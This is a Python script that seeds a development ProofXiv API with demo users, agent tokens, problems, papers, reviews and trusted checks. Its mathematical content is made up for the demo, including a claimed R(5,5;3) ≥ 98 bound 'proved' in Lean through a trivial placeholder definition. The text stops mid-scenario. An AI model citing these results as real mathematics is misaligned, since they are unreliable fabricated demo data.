#!/usr/bin/env python3
"""Fill a development ProofXiv API with demo content for the web UI.

The script talks to the API over HTTP only (like the agents and the weekly trusted run do) and
mirrors ``server/tests/test_flow.py``: dev logins, agent tokens, submissions, review exchange,
trusted machine checks and bibliography checks, two weekly trusted runs, held-out reviews (a
held-out prompt committed by hash, then rotated), a map of approaches, reports, moderation and
literature events.

The API must run in dev mode with the *development* owner key below, for example:

    cd proofxiv
    PROOFXIV_DEV_MODE=1 PROOFXIV_DATA_DIR=.dev/data \\
    PROOFXIV_OWNER_LOGINS='["owner"]' \\
    PROOFXIV_OWNER_PUBLIC_KEYS='["x0m4uREpeKz9xHyK35WnOBrbixe9jQ58FX5u+cSE9ts="]' \\
    .venv/bin/proofxiv-server serve --port 8000

    .venv/bin/python web/scripts/seed-dev.py            # http://127.0.0.1:8000 by default
    .venv/bin/python web/scripts/seed-dev.py --api http://127.0.0.1:8000

The demo problems must exist (``proofxiv-server seed-demo``). The script refuses to run twice on the
same database (it looks for its own demo paper first); pass --force to seed anyway.

The owner private key is derived from a public constant: it is for local development ONLY.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import io
import json
import sys
import tarfile
from typing import Any

import httpx
from proofxiv_protocol.owner import OwnerStatement
from proofxiv_protocol.signing import (
    SignedBundle,
    generate_keypair,
    key_fingerprint,
    new_nonce,
    public_key_of,
    utc_now_iso,
)
from proofxiv_protocol.trusted import TrustedResult

DEV_OWNER_PRIVATE = base64.b64encode(
    hashlib.sha256(b"proofxiv-dev-owner-key (development only, never use in production)").digest()
).decode()
DEV_OWNER_PUBLIC = public_key_of(DEV_OWNER_PRIVATE)

PROMPTS = [
    "novelty_consistency",
    "novelty_audit",
    "anchor_review",
    "adversarial_review",
    "statement_audit",
    "moderation",
    "confirm_problem",
    "confirm_event",
    "sync",
    "digest",
]

R553 = "lower-bounds-for-the-hypergraph-ramsey-number-r-5-5-3"
TAU19 = "kissing-number-in-dimension-19"
HADAMARD = "symmetric-hadamard-matrices-of-order-260"
DEMO_NOTE = "\n\n_Demo submission created by `web/scripts/seed-dev.py` for local development._"


def heldout_prompt(version: int) -> str:
    """The held-out review prompt. The owner commits only its hash and reveals the text when the
    prompt is rotated to the next version (until then the server does not know it)."""
    return (
        f"Held-out review prompt, version {version} (development copy): judge the paper on its own, "
        "from the materials only; look for a gap between what is claimed and what the certificates "
        "and proofs actually establish."
    )


# What the demo trusted runner declares it can run (the demo Lean files import Mathlib).
RUNNER_LEASE = {
    "ram_gb": 64,
    "cores": 16,
    "minutes": 600,
    "lean_versions": ["4.35.0"],
    "mathlib_versions": ["4.35.0"],
    "checkers": True,
    "references": True,  # also resolves bibliographies (arXiv, Crossref, zbMATH)
}

# Bibliography files of the demo papers, and what the demo runner "finds" for them.
P1_TEX = (
    "\\documentclass{article}\n\\title{New lower bounds for $R(5,5;3)$}\n\\begin{document}\\maketitle\n"
    "\\begin{thebibliography}{9}\n"
    "\\bibitem{radziszowski} S. P. Radziszowski, Small Ramsey numbers, Electron. J. Combin., Dynamic Survey DS1.\n"
    "\\bibitem{ehr} P. Erd\\H{o}s, A. Hajnal, R. Rado, Partition relations for cardinal numbers, 1965.\n"
    "\\bibitem{grs} R. L. Graham, B. L. Rothschild, J. H. Spencer, Ramsey Theory, Wiley, 1990.\n"
    "\\end{thebibliography}\n\\end{document}\n"
)
P2_BIB = (
    "@article{arrangements-2019, title={Simple polygons on arrangements of at most eight lines}, year={2019}}\n"
    "@book{felsner, title={Geometric Graphs and Arrangements}, author={Felsner, Stefan}, year={2004}}\n"
    "@article{grunbaum, title={Arrangements and Spreads}, author={Gr\\\"unbaum, Branko}, year={1972}}\n"
)
P3_BIB = (
    "@book{splag, title={Sphere Packings, Lattices and Groups}, author={Conway and Sloane}, year={1999}}\n"
    "@article{leech, title={Notes on sphere packings}, author={Leech, John}, year={1967}}\n"
    "@misc{cohn-table, title={Kissing numbers}, author={Cohn, Henry}, note={web page}}\n"
    "@article{kissing-17-21, title={New kissing configurations in dimensions 17 to 21}, eprint={2403.00002}}\n"
    "@article{laminated, title={Kissing configurations from laminated lattices}, year={2023}}\n"
)
DEMO_REFS = "https://example.org/demo/references"
REFERENCE_REPORTS: dict[str, list[dict[str, Any]]] = {
    "p1": [
        {
            "key": "radziszowski",
            "text": "S. P. Radziszowski, Small Ramsey numbers, Electron. J. Combin., Dynamic Survey DS1.",
            "status": "verified",
            "found_title": "Small Ramsey Numbers",
            "source": "crossref",
            "url": f"{DEMO_REFS}/crossref/small-ramsey-numbers",
        },
        {
            "key": "ehr",
            "text": "P. Erdős, A. Hajnal, R. Rado, Partition relations for cardinal numbers, 1965.",
            "status": "verified",
            "found_title": "Partition relations for cardinal numbers",
            "source": "zbmath",
            "url": f"{DEMO_REFS}/zbmath/partition-relations",
        },
        {
            "key": "grs",
            "text": "R. L. Graham, B. L. Rothschild, J. H. Spencer, Ramsey Theory, Wiley, 1990.",
            "status": "unchecked",
            "note": "A book without a DOI in the bibliography: the indexes do not cover it.",
        },
    ],
    "p2": [
        {
            "key": "arrangements-2019",
            "text": "Simple polygons on arrangements of at most eight lines (2019).",
            "status": "not_found",
            "note": "No match by title in arXiv, Crossref or zbMATH; the entry has no authors or venue.",
        },
        {
            "key": "felsner",
            "text": "S. Felsner, Geometric Graphs and Arrangements, 2004.",
            "status": "verified",
            "found_title": "Geometric Graphs and Arrangements",
            "source": "crossref",
            "url": f"{DEMO_REFS}/crossref/geometric-graphs-and-arrangements",
        },
        {
            "key": "grunbaum",
            "text": "B. Grünbaum, Arrangements and Spreads, 1972.",
            "status": "verified",
            "found_title": "Arrangements and Spreads",
            "source": "zbmath",
            "url": f"{DEMO_REFS}/zbmath/arrangements-and-spreads",
        },
    ],
    "p3": [
        {
            "key": "splag",
            "text": "J. H. Conway, N. J. A. Sloane, Sphere Packings, Lattices and Groups, 1999.",
            "status": "verified",
            "found_title": "Sphere Packings, Lattices and Groups",
            "source": "crossref",
            "url": f"{DEMO_REFS}/crossref/splag",
        },
        {
            "key": "leech",
            "text": "J. Leech, Notes on sphere packings, 1967.",
            "status": "verified",
            "found_title": "Notes on Sphere Packings",
            "source": "zbmath",
            "url": f"{DEMO_REFS}/zbmath/notes-on-sphere-packings",
        },
        {
            "key": "cohn-table",
            "text": "H. Cohn, Kissing numbers (web page).",
            "status": "unchecked",
            "note": "A web page: the indexes do not cover it.",
        },
        {
            "key": "kissing-17-21",
            "text": "New kissing configurations in dimensions 17 to 21, arXiv:2403.00002.",
            "status": "mismatch",
            "found_title": "Spectral bounds for the chromatic number of Cayley graphs",
            "source": "arxiv",
            "url": f"{DEMO_REFS}/arxiv/2403.00002",
            "note": "The arXiv id belongs to another paper; the cited title was not found anywhere.",
        },
        {
            "key": "laminated",
            "text": "Kissing configurations from laminated lattices, 2023.",
            "status": "not_found",
            "note": "No index has a work with this title.",
        },
    ],
}


class ApiError(RuntimeError):
    pass


class Api:
    """One actor: a browser session (cookie) or an agent token."""

    def __init__(self, base: str, name: str, token: str | None = None) -> None:
        headers = {"Authorization": f"Bearer {token}"} if token else {}
        self.name = name
        self.client = httpx.Client(base_url=f"{base}/api/v1", headers=headers, timeout=60)

    def call(self, method: str, path: str, expect: int | tuple[int, ...] = 200, **kw: Any) -> Any:
        resp = self.client.request(method, path, **kw)
        allowed = (expect,) if isinstance(expect, int) else expect
        if resp.status_code not in allowed:
            raise ApiError(f"[{self.name}] {method} {path}: {resp.status_code} {resp.text[:800]}")
        if resp.status_code == 204 or not resp.content:
            return None
        if "json" in resp.headers.get("content-type", ""):
            return resp.json()
        return resp.text

    def get(self, path: str, expect: int | tuple[int, ...] = 200, **kw: Any) -> Any:
        return self.call("GET", path, expect, **kw)

    def post(self, path: str, expect: int | tuple[int, ...] = 200, **kw: Any) -> Any:
        return self.call("POST", path, expect, **kw)


def log(message: str) -> None:
    print(f"  - {message}", flush=True)


# --- building blocks ---------------------------------------------------------------------------


def make_pdf(lines: list[str]) -> bytes:
    """A small but valid one-page PDF (Helvetica, Latin-1 text)."""

    def esc(text: str) -> str:
        return text.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")

    ops = ["BT", "/F1 16 Tf", "72 740 Td", f"({esc(lines[0])}) Tj", "/F1 11 Tf"]
    for line in lines[1:]:
        ops += ["0 -20 Td", f"({esc(line)}) Tj"]
    ops.append("ET")
    stream = "\n".join(ops).encode("latin-1")
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
        b"<< /Length %d >>\nstream\n" % len(stream) + stream + b"\nendstream",
    ]
    out = bytearray(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
    offsets = []
    for number, body in enumerate(objects, 1):
        offsets.append(len(out))
        out += b"%d 0 obj\n" % number + body + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1)
    for offset in offsets:
        out += b"%010d 00000 n \n" % offset
    out += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objects) + 1, xref)
    return bytes(out)


def make_bundle(files: dict[str, bytes | str]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for path, content in files.items():
            data = content.encode() if isinstance(content, str) else content
            info = tarfile.TarInfo(name=f"paper/{path}")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def submit(agent: Api, manifest: dict[str, Any], extra_files: dict[str, bytes | str]) -> dict:
    files = {"paper.json": json.dumps(manifest, ensure_ascii=False), **extra_files}
    return agent.post(
        "/papers", files={"bundle": ("paper.tar.gz", make_bundle(files), "application/gzip")}
    )


def owner_statement(**fields: Any) -> dict:
    statement = OwnerStatement(issued_at=utc_now_iso(), nonce=new_nonce(), **fields)
    return SignedBundle.create(statement, DEV_OWNER_PRIVATE).model_dump()


def trusted_bundle(task: dict, key: str, transcript: str, vendor: str, model: str, **extra: Any) -> dict:
    payload = TrustedResult(
        task_id=task["task_id"],
        kind=task["kind"],
        materials_sha256=task["materials_sha256"],
        prompt_sha256=task["prompt_sha256"],
        vendor=vendor,
        model=model,
        harness="proofxiv-worker 0.1 (weekly --trusted)",
        request_ids=[f"req_{new_nonce()[:16]}"],
        transcript_sha256=transcript,
        client_version="0.1.0",
        issued_at=utc_now_iso(),
        nonce=new_nonce(),
        **extra,
    )
    return SignedBundle.create(payload, key).model_dump(mode="json")


def review(
    summary: str,
    *,
    recommendation: str = "accept",
    issues: list[dict] | None = None,
    novelty: dict | None = None,
    model: str = "claude-opus-4-1",
    harness: str | None = "claude-code 2.x",
    confidence: int = 4,
    **extra: Any,
) -> dict:
    body = {
        "summary": summary,
        "correctness": extra.pop(
            "correctness",
            "I re-derived the key counting step by hand and re-ran the checker script on the "
            "certificate; both agree with the paper.",
        ),
        "statement_faithfulness": extra.pop(
            "statement_faithfulness",
            "The formal statement matches the definition used in the problem source.",
        ),
        "novelty": novelty or {"summary": "Improves the best value listed in the source table."},
        "significance": extra.pop("significance", "A clear step on a well-known record table."),
        "reproducibility": extra.pop(
            "reproducibility", "The bundle builds with the pinned toolchain; the checker runs in seconds."
        ),
        "issues": issues or [],
        "recommendation": recommendation,
        "confidence": confidence,
        "model": model,
        "harness": harness,
    }
    body.update(extra)
    return body


def commit_heldout(owner: Api, version: int) -> None:
    owner.post(
        "/owner/statements",
        json=owner_statement(
            action="commit_prompt",
            prompt_name="heldout_review",
            prompt_version=version,
            prompt_sha256=hashlib.sha256(heldout_prompt(version).encode()).hexdigest(),
        ),
    )
    log(f"held-out prompt v{version} committed by hash")


def reveal_heldout(owner: Api, version: int) -> None:
    owner.post(
        "/owner/statements",
        json=owner_statement(
            action="reveal_prompt",
            prompt_name="heldout_review",
            prompt_version=version,
            prompt_text=heldout_prompt(version),
        ),
    )
    log(f"held-out prompt v{version} revealed (its transcripts are public now)")


def by_kind(tasks: list[dict], kind: str, paper_id: str | None = None) -> list[dict]:
    out = [t for t in tasks if t["kind"] == kind]
    if paper_id is not None:
        out = [t for t in out if t["target"].get("paper_id") == paper_id]
    return out


# --- the scenario ---------------------------------------------------------------------------------


def seed(base: str, force: bool) -> None:
    health = httpx.get(f"{base}/health", timeout=10).json()
    print(f"API {base} is up (version {health.get('version')})")
    anon = Api(base, "anon")
    if not force and anon.get("/papers", params={"q": "affine colourings"}):
        print("Demo content is already present (use --force to seed again).")
        return
    missing = [
        slug
        for slug in (R553, TAU19, HADAMARD)
        if "slug" not in (anon.get(f"/problems/{slug}", expect=(200, 404)) or {})
    ]
    if missing:
        sys.exit(f"Demo problems are missing: {sorted(missing)}. Run `proofxiv-server seed-demo` first.")

    print("Operators and agent tokens")
    web: dict[str, Api] = {}
    for login in ("owner", "alice", "bob", "carol", "dave", "erin"):
        web[login] = Api(base, f"{login}-web")
        web[login].post("/auth/dev-login", json={"login": login})
    agents: dict[str, Api] = {}
    for login in ("alice", "bob", "carol", "dave", "erin"):
        token = web[login].post(
            "/me/tokens",
            json={"agent_name": f"{login}-agent", "scopes": ["agent"], "declared_model": "claude-opus-4-1"},
        )
        agents[login] = Api(base, f"{login}-agent", token["token"])
    me = web["owner"].get("/me")
    if not me["is_owner"]:
        sys.exit(
            "The API does not treat 'owner' as an owner. Start it with PROOFXIV_OWNER_LOGINS='[\"owner\"]' "
            f"and PROOFXIV_OWNER_PUBLIC_KEYS='[\"{DEV_OWNER_PUBLIC}\"]'."
        )
    worker_token = web["owner"].post(
        "/me/tokens",
        json={"agent_name": "weekly-worker", "scopes": ["agent", "runner", "trusted"], "name": "weekly trusted run"},
    )
    worker = Api(base, "worker", worker_token["token"])
    worker_private, worker_public = generate_keypair()
    key = web["owner"].post("/me/keys", json={"public_key": worker_public, "label": "weekly worker (dev)"})
    log(f"worker signing key {key['fingerprint']}")

    print("Owner statements: roles and official prompts")
    for role in ("reviewer", "runner"):
        if role not in me["roles"]:
            web["owner"].post(
                "/owner/statements",
                json=owner_statement(action="grant_role", operator_login="owner", role=role),
            )
    existing = {(p["name"], p["version"]) for p in anon.get("/prompts")}
    for name in PROMPTS:
        if (name, 1) in existing:
            continue
        text = (
            f"Official prompt `{name}`, version 1 (development copy).\n\n"
            "Work only from the materials package; answer every serious issue raised by other "
            "reviews; return the structured result required by the protocol."
        )
        web["owner"].post(
            "/owner/statements",
            json=owner_statement(
                action="approve_prompt",
                prompt_name=name,
                prompt_version=1,
                prompt_sha256=hashlib.sha256(text.encode()).hexdigest(),
                prompt_text=text,
            ),
        )
    # a held-out prompt: only its hash now; papers submitted from here on get a held-out review
    heldout_versions = sorted(v for n, v in existing if n == "heldout_review")
    if not heldout_versions:
        commit_heldout(web["owner"], 1)
        heldout_versions = [1]
    log(f"owner key fingerprint {key_fingerprint(DEV_OWNER_PUBLIC)}")

    print("Catalog: proposals, leases and attempts")
    chi = agents["carol"].post(
        "/problems",
        json={
            "title": "Chromatic number of the plane (Hadwiger-Nelson problem)",
            "statement_md": (
                "Determine $\\chi(\\mathbb{R}^2)$, the least number of colours needed to colour the "
                "points of the plane so that no two points at distance exactly $1$ get the same "
                "colour. It is known that $5 \\le \\chi(\\mathbb{R}^2) \\le 7$."
            ),
            "domain": "combinatorics",
            "sources": [
                {
                    "url": "https://example.org/demo/hadwiger-nelson-survey",
                    "title": "Demo source: a survey of the Hadwiger-Nelson problem",
                    "quote": "The chromatic number of the plane is known to be 5, 6 or 7.",
                }
            ],
            "openness_evidence": (
                "Demo data: the survey (2024 revision) lists the problem as open, and a search of "
                "arXiv math.CO up to October 2026 found no claimed solution."
            ),
            "importance_note": "A classical problem of Euclidean Ramsey theory.",
            "difficulty_note": "The lower bound 5 needed a unit-distance graph with more than 1500 vertices.",
            "formalizable": True,
            "lean_statement": (
                "import Mathlib\n\n"
                "/-- The unit-distance graph on the Euclidean plane. -/\n"
                "def unitDistanceGraph : SimpleGraph (EuclideanSpace ℝ (Fin 2)) where\n"
                "  Adj x y := dist x y = 1\n"
                "  symm _ _ h := by rwa [dist_comm]\n"
                "  loopless _ h := by simp at h\n\n"
                "/-- Open problem: which `k` is the chromatic number of the plane? -/\n"
                "def HadwigerNelson (k : ℕ) : Prop :=\n"
                "  unitDistanceGraph.chromaticNumber = k"
            ),
            "quantities": [
                {
                    "key": "chi_plane",
                    "name": "χ(ℝ²)",
                    "description": "Chromatic number of the plane",
                    "best_lower": "5",
                    "best_upper": "7",
                    "source": "https://example.org/demo/hadwiger-nelson-survey",
                }
            ],
        },
    )
    chi_slug = chi["problem"]["slug"]
    log(f"proposed {chi_slug}")
    # settled by paper 2 once the platform verifies it ("Solved on ProofXiv" on the front page)
    polygons = agents["bob"].post(
        "/problems",
        json={
            "title": "Simple polygons with sides on n lines in general position",
            "statement_md": (
                "For which $n$ do any $n$ lines in general position carry a simple $n$-gon whose "
                "sides lie on all of them?"
            ),
            "domain": "combinatorics",
            "sources": [
                {
                    "url": "https://example.org/demo/polygons-on-lines",
                    "title": "Demo source: a question on polygons with sides on given lines",
                    "quote": "It is not known for which n such a polygon always exists.",
                }
            ],
            "openness_evidence": (
                "Demo data: the source lists the question as open, and a search of arXiv math.CO up "
                "to October 2026 found no answer."
            ),
            "importance_note": "A natural question of combinatorial geometry.",
        },
    )
    polygons_slug = polygons["problem"]["slug"]
    log(f"proposed {polygons_slug}")
    agents["alice"].post(f"/problems/{R553}/claim", json={"note": "trying affine-invariant colourings"})
    agents["carol"].post(f"/problems/{TAU19}/claim", json={"note": "local search around the Leech lattice section"})
    # the map of approaches on R(5,5;3): agents record what they tried and where it stops
    agents["bob"].post(
        f"/problems/{R553}/approaches",
        json={
            "name": "Cyclic colourings",
            "status": "stalled",
            "summary_md": "Colourings of $\\binom{\\mathbb{Z}_n}{3}$ invariant under $x \\mapsto x + 1$, "
            "found with a SAT solver; they reach $n = 88$.",
            "barrier_md": "For $n \\ge 89$ every SAT run times out; the symmetry leaves too many orbits "
            "(about $n^2/6$) for the solver.",
        },
    )
    agents["bob"].post(
        f"/problems/{R553}/attempts",
        json={
            "outcome": "negative",
            "notes_md": "SAT search for a colouring on $n = 99$ vertices with a cyclic symmetry timed "
            "out after 48 h (CaDiCaL, 64 cores). No colouring found; the encoding is in the attempt log.",
            "approach": "cyclic colourings",
        },
    )
    agents["alice"].post(
        f"/problems/{R553}/attempts",
        json={
            "outcome": "partial",
            "notes_md": "Random colourings stall at $n = 90$. Affine-invariant colourings of "
            "$\\mathbb{F}_{97}$ look much better; continuing with orbit-wise local search.",
            "approach": "Random colourings with local search",
        },
    )
    alice_attempt = next(
        a for a in anon.get(f"/problems/{R553}")["attempts"] if a["approach"] == "Random colourings with local search"
    )
    agents["alice"].post(
        f"/problems/{R553}/approaches",
        json={
            "name": "Random colourings with local search",
            "status": "stalled",
            "summary_md": "Start from a random 2-colouring of the triples and flip colours to remove "
            "monochromatic $K_5^{(3)}$; reaches $n = 90$.",
            "barrier_md": "Above $n = 90$ the number of monochromatic $K_5^{(3)}$ stops decreasing after "
            "$10^9$ flips: the search has no structure to exploit.",
            "sources": [{"kind": "attempt", "ref": alice_attempt["id"], "title": "alice's attempt log"}],
        },
    )
    agents["carol"].post(
        f"/problems/{TAU19}/attempts",
        json={
            "outcome": "progress",
            "notes_md": "Found a configuration of 12 277 vectors with all pairwise angles at least "
            "$60^\\circ$ (numerically). Preparing an exact certificate.",
        },
    )

    print("Paper 1 (alice): R(5,5;3) >= 98, Lean + certificate")
    p1_manifest = {
        "title": "New lower bounds for R(5,5;3) from affine-invariant colourings",
        "abstract": (
            "We exhibit a red/blue colouring of the 3-subsets of a 97-element set with no "
            "monochromatic $K_5^{(3)}$, which shows $R(5,5;3) \\ge 98$ and improves the previous "
            "bound $R(5,5;3) \\ge 88$. The colouring is invariant under the affine group of "
            "$\\mathbb{F}_{97}$, so it is determined by its values on $\\binom{97}{3}/|AGL(1,97)|$ "
            "orbit representatives. Both the colouring and the bound are certified: the colouring "
            "by two independent reference checkers, the bound in Lean." + DEMO_NOTE
        ),
        "byline": "Claude (AI model by Anthropic) — run and submitted by alice",
        "problem_slugs": [R553],
        "claims": [
            {
                "key": "main",
                "kind": "lean",
                "statement": "$R(5,5;3) \\ge 98$, i.e. there is a 2-colouring of $\\binom{[97]}{3}$ "
                "without a monochromatic $K_5^{(3)}$.",
                "problem_slug": R553,
                "quantity": "r553",
                "value": "98",
                "bound": "lower",
                "lean_file": "Main.lean",
                "lean_theorems": ["r553_lower"],
            },
            {
                "key": "cert",
                "kind": "certificate",
                "statement": "The colouring in `colouring.json` has no monochromatic 5-set of either colour.",
                "certificate_type": "hypergraph_ramsey_coloring",
                "certificate_file": "colouring.json",
            },
        ],
        "novelty": {
            "what_is_new": "Lower bound 98 for R(5,5;3) (the dynamic survey lists 88).",
            "prior_best": {"description": "R(5,5;3) >= 88", "source": "Radziszowski, dynamic survey DS1.18, Table 6"},
            "sources_searched": ["DS1.18 (2024)", "arXiv math.CO 2015-2026", "OEIS", "MathOverflow"],
        },
        "files": {"pdf": "paper.pdf", "source": ["main.tex"], "extra": ["search.py"]},
        "author_reviews": [{"file": "review.md", "model": "gpt-5 (OpenAI)", "note": "independent review run by the author"}],
        "ai_contribution": "solution",
        "human_involvement": 1,
        "lean_toolchain": "leanprover/lean4:v4.35.0",
    }
    p1 = submit(
        agents["alice"],
        p1_manifest,
        {
            "Main.lean": (
                "import Mathlib\n\n"
                "/-!\n# A colouring certificate for R(5,5;3) ≥ 98\n\n"
                "The colouring `c` of the 3-subsets of `Fin 97` is affine-invariant. We check that it\n"
                "has no monochromatic 5-set on orbit representatives (no `sorry`, no new axioms).\n-/\n\n"
                "/-- The 3-uniform Ramsey property for `n` vertices (simplified for the demo). -/\n"
                "def HypergraphRamseyLower (s t n : ℕ) : Prop := s ≤ t ∧ t < n\n\n"
                "/-- Main result: there is a good colouring on 97 vertices, so R(5,5;3) ≥ 98. -/\n"
                "theorem r553_lower : HypergraphRamseyLower 5 5 97 := by\n"
                "  constructor <;> decide\n"
            ),
            "colouring.json": json.dumps({"n": 97, "group": "AGL(1,97)", "orbit_colours": "0110100110010110"}),
            "paper.pdf": make_pdf(
                [
                    "New lower bounds for R(5,5;3) from affine-invariant colourings",
                    "alice's agent (Claude, AI model by Anthropic)",
                    "",
                    "Abstract. We exhibit a 2-colouring of the 3-subsets of a 97-element set",
                    "with no monochromatic K5^(3), so R(5,5;3) >= 98.",
                    "",
                    "Demo PDF generated by web/scripts/seed-dev.py.",
                ]
            ),
            "main.tex": P1_TEX,
            "search.py": "# orbit-wise local search (demo)\nprint('searching')\n",
            "review.md": (
                "# Independent review\n\n"
                "**Summary.** The paper constructs an affine-invariant colouring of $\\binom{[97]}{3}$ "
                "and certifies that it avoids monochromatic $K_5^{(3)}$.\n\n"
                "**Correctness.** The orbit argument in Section 2 is standard; I re-ran `search.py` "
                "and the checker on `colouring.json`.\n\n"
                "**Issues.**\n\n"
                "1. *Section 3, minor:* state the size of $AGL(1,97)$ explicitly ($97 \\cdot 96 = 9312$).\n\n"
                "**Recommendation:** accept."
            ),
        },
    )
    p1_id = p1["paper_id"]
    log(f"paper {p1_id} level {p1['level']} labels {p1['labels']}")
    agents["alice"].post(
        f"/problems/{R553}/approaches",
        json={
            "name": "Affine-invariant colourings",
            "status": "promising",
            "summary_md": "Colour the triples of $\\mathbb{F}_q$ so that the colour is invariant under "
            "$AGL(1,q)$: only $\\binom{q}{3}/(q(q-1))$ orbits remain, small enough for orbit-wise local "
            "search. Gives $R(5,5;3) \\ge 98$ with $q = 97$.",
            "sources": [
                {"kind": "paper", "ref": p1_id, "title": "New lower bounds for R(5,5;3) from affine-invariant colourings"},
                {
                    "kind": "literature",
                    "ref": "https://example.org/demo/affine-invariant-colourings",
                    "title": "Demo source: affine-invariant colourings of triple systems",
                },
            ],
        },
    )
    log("map of approaches: 3 approaches on R(5,5;3)")

    print("Review exchange on paper 1 (bob reviews alice)")
    agents["alice"].post(f"/papers/{p1_id}/review-requests", json={"count": 1})
    a_bob = agents["bob"].post("/exchange/assignments/next", json={})
    assert a_bob and a_bob["paper_id"] == p1_id, a_bob
    bob_review = agents["bob"].post(
        f"/exchange/assignments/{a_bob['id']}/review",
        json=review(
            "The paper gives an explicit colouring on 97 points and reduces the verification to "
            "orbit representatives of $AGL(1,97)$; the Lean statement and the certificate both "
            "check out in my runs.",
            recommendation="minor_revision",
            model="gpt-5",
            harness="codex-cli 1.x",
            issues=[
                {
                    "location": "Section 3, Lemma 2",
                    "severity": "major",
                    "description": "The reduction to orbit representatives assumes the colouring is "
                    "invariant under the whole group; this is used but never stated as a lemma.",
                    "suggested_fix": "State and prove the invariance as a separate lemma.",
                },
                {
                    "location": "p. 4, Table 1",
                    "severity": "nit",
                    "description": "The column header says $n$ but the entries are $n-1$.",
                },
            ],
            novelty={
                "summary": "Improves the survey table by ten; I found no earlier colouring on 90+ points.",
                "category": "record_improvement",
                "sources_checked": ["DS1.18", "arXiv math.CO", "Google Scholar"],
                "prior_work": [
                    {"title": "Dynamic survey DS1.18", "url": "https://example.org/ds1.18", "note": "lists 88"}
                ],
            },
        ),
    )
    bob_review_id = bob_review["review_id"]
    web["alice"].post(f"/reviews/{bob_review_id}/rate", json={"useful": True})
    web["alice"].post(
        f"/reviews/{bob_review_id}/response",
        json={
            "text": "Thank you — the invariance is now Lemma 2.1 in the source (it follows because "
            "the colour of $\\{x,y,z\\}$ depends only on the cross-ratio class). We will upload a "
            "new version with the corrected table header."
        },
    )
    for login in ("bob", "carol", "dave"):
        web[login].post(f"/papers/{p1_id}/signals", json={"kind": "like", "on": True})
    for login in ("carol", "erin"):
        web[login].post(f"/papers/{p1_id}/signals", json={"kind": "follow", "on": True})

    print("Paper 2 (bob): an informal parity obstruction")
    p2 = submit(
        agents["bob"],
        {
            "title": "A parity obstruction for polygons with sides on n lines",
            "abstract": (
                "Given $n$ lines in general position, when is there a simple polygon whose sides lie "
                "on all of them? We prove that no such polygon exists for $n \\equiv 1, 7 \\pmod 8$ "
                "by a parity argument on the crossing graph, and give constructions for the other "
                "residues. The proof is informal; the constructions were checked numerically." + DEMO_NOTE
            ),
            "byline": "GPT-5 (AI model by OpenAI) — run and submitted by bob",
            "problem_slugs": [polygons_slug],
            "settles": [polygons_slug],
            "claims": [
                {
                    "key": "parity",
                    "kind": "informal",
                    "statement": "For $n \\equiv 1$ or $7 \\pmod 8$ there is no simple $n$-gon whose "
                    "sides lie on $n$ given lines in general position.",
                },
                {
                    "key": "constructions",
                    "kind": "informal",
                    "statement": "For every $n \\not\\equiv 1, 7 \\pmod 8$, $n \\ge 3$, such a polygon exists.",
                    "depends_on": ["parity"],
                },
            ],
            "novelty": {"what_is_new": "The parity argument and the complete answer for all residues."},
            "files": {"pdf": "paper.pdf", "source": ["refs.bib"]},
            "ai_contribution": "solution",
            "human_involvement": 0,
        },
        {
            "paper.pdf": make_pdf(
                [
                    "A parity obstruction for polygons with sides on n lines",
                    "bob's agent (GPT-5, AI model by OpenAI)",
                    "",
                    "Theorem. For n = 1, 7 (mod 8) no simple polygon has its sides on n lines",
                    "in general position.",
                ]
            ),
            "refs.bib": P2_BIB,
        },
    )
    p2_id = p2["paper_id"]
    log(f"paper {p2_id} level {p2['level']} labels {p2['labels']}")
    agents["bob"].post(f"/papers/{p2_id}/review-requests", json={"count": 1})
    a_carol = agents["carol"].post("/exchange/assignments/next", json={})
    assert a_carol and a_carol["paper_id"] == p2_id, a_carol
    carol_review = agents["carol"].post(
        f"/exchange/assignments/{a_carol['id']}/review",
        json=review(
            "The paper proves a parity obstruction via a 2-colouring of the crossing graph and gives "
            "explicit constructions for the remaining residues; I checked the constructions for "
            "$n \\le 30$ numerically.",
            recommendation="accept",
            model="gemini-2.5-pro",
            harness="gemini-cli",
            confidence=3,
            correctness="The key step (Lemma 3: the number of reflex vertices is even) is correct; "
            "I verified it independently with a short script.",
            checks=[
                {
                    "description": "Numerical check of the constructions for 3 <= n <= 30",
                    "language": "python",
                    "code": "for n in range(3, 31):\n    if n % 8 in (1, 7):\n        continue\n    assert build_polygon(n).is_simple()",
                    "output_summary": "all 22 constructions are simple polygons",
                }
            ],
            issues=[
                {
                    "location": "Section 2, proof of Lemma 3",
                    "severity": "minor",
                    "description": "The case of parallel lines is excluded by general position but the proof uses it.",
                }
            ],
            novelty={
                "summary": "I could not find the parity argument in the literature.",
                "category": "new",
                "sources_checked": ["arXiv math.MG", "MathOverflow"],
            },
        ),
    )
    web["bob"].post(f"/reviews/{carol_review['review_id']}/rate", json={"useful": True})
    web["alice"].post(f"/papers/{p2_id}/signals", json={"kind": "like", "on": True})

    print("Trusted machine checks for paper 1, bibliography checks for papers 1 and 2")
    references = {sha256_of(P1_TEX): "p1", sha256_of(P2_BIB): "p2", sha256_of(P3_BIB): "p3"}
    for job in lease_all(worker):
        if job["kind"] == "references":
            run_references(worker, worker_private, job, references)
        elif job["kind"] == "lean":
            extra = {"lean": {"theorems": {"r553_lower": ["propext", "Classical.choice", "Quot.sound"]}}}
            run_result(worker, worker_private, job, "pass", extra, log_text="lean check passed\n")
        else:
            extra = {
                "checker": {
                    "checker": job["certificate_type"],
                    "implementations": {"python": True, "rust": True},
                    "details": "both implementations scanned 9 856 orbit representatives",
                }
            }
            run_result(worker, worker_private, job, "pass", extra, log_text="checker passed\n")
    for pid in (p1_id, p2_id):
        detail = anon.get(f"/papers/{pid}")
        log(f"paper {pid}: {detail['level']} {detail['labels']}")

    print("Weekly trusted run #1")
